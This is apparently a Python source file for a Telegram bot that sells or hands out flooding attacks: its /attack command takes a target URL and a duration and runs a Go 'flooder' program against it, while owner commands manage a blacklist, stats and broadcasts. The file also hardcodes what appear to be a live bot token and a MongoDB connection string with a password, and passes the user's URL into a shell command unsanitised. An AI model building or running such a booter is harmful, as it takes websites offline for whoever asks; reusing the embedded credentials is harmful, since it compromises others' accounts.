import os
import subprocess
import time
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, filters
from pymongo import MongoClient

# Configuration
BOT_TOKEN = "7417294211:AAHD5mhZ2JUNN-PtcsAq75WwxFiG3I1Yx7k"
OWNER_IDS = [5606990991, 5460343986]
MONGO_URL = "mongodb+srv://l2u341klu3:LhdzrrZpUMRaTYnS@cluster0.zs2ys.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# MongoDB Client Setup
client = MongoClient(MONGO_URL)
db = client["bot_db"]
blacklist_collection = db["blacklist"]
stats_collection = db["stats"]

# Global Variables
active_attacks = {}

# Check if user is blacklisted
def is_blacklisted(user_id):
    return blacklist_collection.find_one({"user_id": user_id}) is not None

# Start Command
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Welcome to the Bot. Use /attack to start an attack.")

# Attack Command
def attack(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if is_blacklisted(user_id):
        update.message.reply_text("You are blacklisted and cannot use this bot.")
        return

    if len(active_attacks) >= 2:
        attack_info = "\n".join([f"Attack {i+1}: {data['url']} - {data['remaining']}s left"
                                 for i, data in enumerate(active_attacks.values())])
        update.message.reply_text(f"Two attacks are currently in progress:\n{attack_info}")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /attack <url> <duration>")
        return

    attack_id = str(user_id) + "_" + str(int(time.time()))
    active_attacks[attack_id] = {"url": url, "remaining": duration}
    threading.Thread(target=execute_attack, args=(attack_id, update)).start()

# Execute Attack Function
def execute_attack(attack_id, update):
    attack_data = active_attacks[attack_id]
    url, duration = attack_data["url"], attack_data["remaining"]
    command = f"go run flooder.go {url} {duration}"

    try:
        subprocess.run(command, shell=True, check=True)
        update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
    except subprocess.CalledProcessError:
        update.message.reply_text("Failed to start the attack.")
    finally:
        del active_attacks[attack_id]

# Owner Commands
def blacklist(update: Update, context: CallbackContext):
    if update.message.from_user.id not in OWNER_IDS:
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /Blacklist <user_id>")
        return

    blacklist_collection.insert_one({"user_id": user_id})
    update.message.reply_text(f"User {user_id} has been blacklisted.")

def rm_blacklist(update: Update, context: CallbackContext):
    if update.message.from_user.id not in OWNER_IDS:
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /rmBlacklist <user_id>")
        return

    blacklist_collection.delete_one({"user_id": user_id})
    update.message.reply_text(f"User {user_id} has been removed from the blacklist.")

def stats(update: Update, context: CallbackContext):
    if update.message.from_user.id not in OWNER_IDS:
        return

    total_users = stats_collection.estimated_document_count()
    active_users = len(active_attacks)
    update.message.reply_text(f"Total users: {total_users}\nActive attacks: {active_users}")

def broadcast(update: Update, context: CallbackContext):
    if update.message.from_user.id not in OWNER_IDS:
        return

    message = update.message.reply_to_message.text if update.message.reply_to_message else " ".join(context.args)
    users = stats_collection.find({})
    for user in users:
        try:
            context.bot.send_message(chat_id=user["user_id"], text=message)
        except:
            pass

    update.message.reply_text("Message broadcasted.")

# Error Handling
def error_handler(update: Update, context: CallbackContext):
    print(f"Update {update} caused error {context.error}")

# Setup Handlers
updater = Updater(token=BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("attack", attack))
dispatcher.add_handler(CommandHandler("Blacklist", blacklist))
dispatcher.add_handler(CommandHandler("rmBlacklist", rm_blacklist))
dispatcher.add_handler(CommandHandler("Stats", stats))
dispatcher.add_handler(CommandHandler("Broadcast", broadcast))
dispatcher.add_error_handler(error_handler)

# Start the Bot
if __name__ == "__main__":
    updater.start_polling()
    updater.idle()
